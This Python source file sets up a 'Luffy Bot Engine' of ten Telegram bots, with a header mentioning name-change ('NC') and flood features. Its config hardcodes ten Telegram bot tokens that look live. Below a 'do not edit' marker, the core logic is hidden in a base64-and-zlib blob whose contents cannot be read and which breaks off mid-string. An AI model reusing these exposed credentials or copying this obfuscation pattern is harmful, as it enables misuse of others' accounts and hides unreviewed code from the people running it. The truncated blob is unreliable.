# ═══════════════════════════════════════════════════════════════
# 🕸️  LUFFY BOT ENGINE  —  10 BOTS + OWNER (NC1→NC10 + FLOOD SHIELD + AI/CONSOLE)
#     ⚠️  PRIVATE SOURCE — do not distribute
# ═══════════════════════════════════════════════════════════════

import asyncio, os, time, json, random, re, logging
from io import BytesIO
from datetime import datetime, timezone, timedelta
from pathlib import Path
from collections import OrderedDict, deque
from urllib.parse import quote_plus

import httpx
from telegram import Bot, Update, ChatPermissions
from telegram.error import RetryAfter, Forbidden, BadRequest
from telegram.ext import (
    Application, ApplicationBuilder, MessageHandler,
    ContextTypes, filters,
)

# ═══════════════════════════════════════════════════════════════
# ⚙️  CONFIG
# ═══════════════════════════════════════════════════════════════

OWNER_ID = 8906847090

BOT_TOKENS = [
    "8882933005:AAEgjJrYdRVEBl0dDgCk28Svjmffg5QxyuY",
    "8864630388:AAENXNmHc9DpkLR9Ia3fchnfqZERVRWtd30",
    "8764700341:AAGozsY5ZUCZjqe3Xid3UkTReDH8zNAb-0k",
    "8253564225:AAE4I8Y2kI3moZuogqDwlKcPSnzgvl42LsA",
    "8287809717:AAF53qpiIWjksq8JQ8lxPOhxjaNdhUZuJ8o",
    "8741193288:AAEDi9SxC86LXAaeUAGPuPdQfySSnZyO3-M",
    "8809519858:AAHSgfT2gVJ27OiaYEr4-8RVh6p-i2mtetk",
    "8854596891:AAGeXzw_g90_nUP8_AKYDvavQUkuKJEOfBk",
    "8837970214:AAGdM6w_bfiRsWl7BQEm69QFsz6jl-ctHMw",
    "8878033996:AAFsgfy1vloTzZFrv4qzLjXgv4oxi_f7Lr4"
]

PREFIX        = "~"
IST           = timezone(timedelta(hours=5, minutes=30))
REPLY_PREFIX  = "⸎❄️ "
DEFAULT_DELAY = 0.0

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s"
)
log = logging.getLogger("luffy")

START_TS = time.monotonic()

BOT_TOKENS = [t.strip() for t in BOT_TOKENS
              if t.strip() and t.strip() != "ADD TOKEN HERE"]
if not BOT_TOKENS:
    raise SystemExit("❌ Koi valid token nahi mila.")

log.info(f"🔑 Loaded {len(BOT_TOKENS)} token(s)")
log.info(f"👤 OWNER_ID = {OWNER_ID}")


def prefixed(text: str) -> str:
    return f"{REPLY_PREFIX}{text}"

"""
🔒  Encrypted build. Do not edit below the marker.
    Branding + CONFIG above are plaintext.
"""
import base64 as _b64, zlib as _zlib

_CORE_B64 = (
    "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"
